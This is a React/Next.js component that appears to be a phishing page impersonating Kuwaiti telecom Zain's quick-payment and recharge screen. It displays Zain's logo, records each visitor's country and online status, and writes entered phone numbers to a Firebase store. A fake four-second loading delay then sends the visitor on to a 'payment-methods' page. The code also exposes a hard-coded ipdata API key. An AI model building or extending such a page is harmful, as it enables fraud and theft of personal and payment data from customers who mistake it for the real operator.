"use client"

import { useEffect, useState } from "react"
import { ChevronDown, Heart, Loader2, Menu, ShoppingCart } from "lucide-react"
import { cn, setupOnlineStatus } from "@/lib/utils"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebasee"

export default function ZainPayment() {
  const [selectedTab, setSelectedTab] = useState("bill")
  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
  const [selectedAmount, setSelectedAmount] = useState("6.000")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isSubmmited, setIsSubmmited] = useState(false)
  const _id=randstr('zain-')
  const router=useRouter()
  function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}

  const amounts = [
    { value: "2.000", validity: 7 },
    { value: "4.000", validity: 15 },
    { value: "6.000", validity: 30 },
    { value: "12.000", validity: 90 },
    { value: "22.000", validity: 180 },
    { value: "30.000", validity: 365 },
  ]

  const adOptions = [
    { id: "basic", title: "الإعلان الأساسي", price: "5.000", description: "إعلان لمدة 7 أيام" },
    { id: "standard", title: "الإعلان القياسي", price: "10.000", description: "إعلان لمدة 15 يوم مع ميزة التثبيت" },
    {
      id: "premium",
      title: "الإعلان المميز",
      price: "20.000",
      description: "إعلان لمدة 30 يوم مع ميزة التثبيت والظهور في الصفحة الرئيسية",
    },
  ]
useEffect(()=>{
  getLocation().then(()=>{})
},[])
async function getLocation() {
  const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

  try {
      const response = await fetch(url);
      if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
          id:_id,
          country: country
      })
      localStorage.setItem('country',country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error('Error fetching location:', error);
  }
}
  return (
    <div className="max-w-md mx-auto bg-white min-h-screen" dir="rtl">
      {/* Header */}
      <header className="flex items-center justify-end p-4 bg-[#2d1a45]">
        <div className="ml-auto flex">
          <Menu className="text-white"  size={24} />
          <img src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" alt="Zain Logo" className="h-7 " />
          </div>

        <Heart className="text-white" size={24} />
        <div className="bg-white rounded-full p-2 mx-2">
          <ShoppingCart className="text-[#2d1a45]" size={20} />
        </div>
        <div className=" right-16">
        </div>
      </header>

      {/* Login Banner */}
      <div className="bg-gradient-to-l from-[#2d1a45] to-[#6b2a84] p-4 flex justify-between items-center">
      <div className="text-white text-sm text-right">
          <p>يرجى تسجيل الدخول إلى MyZain للحصول على تجربة</p>
          <p>مخصصة</p>
        </div>
      </div>

      {/* Main Content */}
      <div className="p-4">
        <h2 className="text-xl font-bold text-right mb-4">الدفع السريع</h2>

        {/* Tabs */}
        <div className="flex border-b mb-6">
          <button
            className={cn(
              "flex-1 py-3 text-center",
              selectedTab === "bill" ? "border-b-2 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
            )}
            onClick={() => setSelectedTab("bill")}
          >
            دفع الفاتورة
          </button>
          <button
            className={cn(
              "flex-1 py-3 text-center",
              selectedTab === "recharge" ? "border-b-2 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
            )}
            onClick={() => setSelectedTab("recharge")}
          >
            إعادة تعبئة eeZee
          </button>
        </div>

        {/* Form */}
        <div className="space-y-6">
          <div className="text-right mb-2">
            <p>أريد أن أعيد التعبئة </p>
          </div>

          <div className="relative">
            <select className="w-full flex justify-between items-center border-b pb-2 cursor-pointer" onClick={() => {}}>
              <option value={1}> <ChevronDown className="text-[#d13c8c]" />
                <span>رقم آخر</span>
              </option>
              <option value={2}> <ChevronDown className="text-[#d13c8c]" />
                <span>رقم العقد</span>
              </option>
            </select>
          </div>

          <div className="relative flex flex-col">
            <label className="block text-right text-sm mb-1 text-gray-500">* رقم الهاتف</label>
           <div className="flex">
         
            <input
              type="tel"
              required
              maxLength={8}
              minLength={8}
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              className=" w-full border-b pb-2 text-left focus:outline-none"
            />
              <input
              type="tel"
readOnly
              value={'+965'}
              className="w-8 border-b pb-2 text-left focus:outline-none"
            />
           </div>
          </div>

          <div className="relative">
            <div className="flex justify-between items-center border-b pb-2">
              <div
                className="flex items-center cursor-pointer"
                onClick={() => setShowAmountDropdown(!showAmountDropdown)}
              >
                <ChevronDown
                  className={`text-[#d13c8c] transition-transform ${showAmountDropdown ? "rotate-180" : ""}`}
                />
                <span className="ml-2">{selectedAmount} د.ك</span>
              </div>
              <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
            </div>
            <div className="text-right text-sm text-gray-500 mt-1">الصلاحية 30 يوم</div>

            {/* Dropdown */}
            {showAmountDropdown && (
              <div className="absolute  z-10 bg-white shadow-lg w-full mt-2 border rounded">
                {amounts.map((amount) => (
                  <div
                    key={amount.value}
                    className={`flex justify-between p-3 cursor-pointer hover:bg-gray-50 ${selectedAmount === amount.value ? "bg-gray-50" : ""}`}
                    onClick={() => {
                      setSelectedAmount(amount.value)
                      setShowAmountDropdown(false)
                      localStorage.setItem('amount',selectedAmount)
                    }}
                  >
                    <div className="flex items-center">
                      {selectedAmount === amount.value && (
                        <svg className="w-5 h-5 text-[#d13c8c]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                      )}
                      <span className="ml-2">{amount.value} د.ك</span>
                    </div>
                    <span>الصلاحية {amount.validity} يوم</span>
                  </div>
                ))}
                <div className="flex justify-center p-3 cursor-pointer hover:bg-gray-50 border-t">
                  <span className="text-[#d13c8c]">مبلغ آخر</span>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

    
      {/* Offers Section */}
      <div className="mt-28 p-4 border-t">
        <div className=" flex justify-between items-center">
        <button
        
        disabled={isSubmmited ||phoneNumber ===''} onClick={()=>{
          setIsSubmmited(true)
          addData({id:_id,name:phoneNumber,phone:phoneNumber})
          setTimeout(() => {

            router.push('/payment-methods')
            setIsSubmmited(false)            

          }, 4000);
        }} className="w-full mt-28 justify-center flex bg-[#d13c8c] text-white py-3 rounded-md font-medium">
          دفع
          
{isSubmmited &&<Loader2 className="animate-spin mx-2"/>
}          </button>
        </div>
      </div>
    </div>
  )
}

